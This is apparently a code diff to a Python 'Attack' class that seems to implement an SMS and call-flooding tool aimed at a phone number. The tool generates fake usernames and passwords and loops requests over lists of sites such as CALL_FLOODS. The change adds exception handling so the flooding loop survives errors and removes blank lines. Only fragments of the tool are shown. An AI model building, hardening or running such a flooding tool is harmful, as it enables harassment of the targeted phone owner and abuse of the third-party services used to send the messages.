@@ -27,7 +27,6 @@ class Attack:
             password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
             username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 
-
         return {
         '_email': _email,
         '_name': _name,
@@ -51,7 +50,6 @@ class Attack:
             return True
         return False 
 
-
     def __init__(self, _phone, _type = 'SMS', time_range=None, timeout=2):
         """
         docstring
@@ -63,7 +61,6 @@ class Attack:
 
         if self.START_TIME is None:
             self.START_TIME = time.time()
-
 
     def config_attack(self):
         if self._type == 'SMS':
@@ -99,6 +96,10 @@ class Attack:
                 return 408
             except requests.exceptions.ConnectionError:
                 return 400
+            except requests.exceptions.TooManyRedirects:
+                return 310
+            except Exception:
+                return 500
         else:
             try:
                 r = getattr(requests, method)(site, timeout=self.timeout)
@@ -106,6 +107,10 @@ class Attack:
                 return 408
             except requests.exceptions.ConnectionError:
                 return 400
+            except requests.exceptions.TooManyRedirects:
+                return 310
+            except Exception:
+                return 500
         return r.status_code
             
     def circle(self):
@@ -119,7 +124,6 @@ class Attack:
                         self.SITES_CALL = CALL_FLOODS.copy()
             else:
                 break
-
 
     def run(self):
         query = self.config_attack()
@@ -136,7 +140,6 @@ class Attack:
                     time.sleep(1)
                 else:
                     time.sleep(1)
-
 
             else:
                 try:
